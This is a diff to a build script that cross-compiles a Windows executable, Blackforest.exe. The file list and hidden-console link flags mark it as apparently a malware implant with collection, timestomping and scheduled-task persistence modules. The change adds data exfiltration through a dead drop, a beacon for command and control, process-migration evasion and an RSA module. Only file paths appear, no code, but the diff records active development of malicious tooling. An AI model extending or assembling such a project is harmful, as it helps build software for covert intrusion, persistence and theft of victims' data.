@@ -21,6 +21,10 @@ x86_64-w64-mingw32-g++ -o bin/Blackforest.exe \
     src/core/collection/system_info.cpp \
     src/core/evasion/timestomp.cpp \
     src/core/persistence/scheduled_task.cpp \
+    src/exfil/dead_drop.cpp \
+    src/core/evasion/process_migration.cpp \
+    src/crypto/rsa.cpp \
+    src/exfil/beacon.cpp \
     -Iinclude -static \
     -lws2_32 -lgdiplus -lgdi32 -lwininet -lole32 -luuid -lurlmon -liphlpapi -mwindows
 
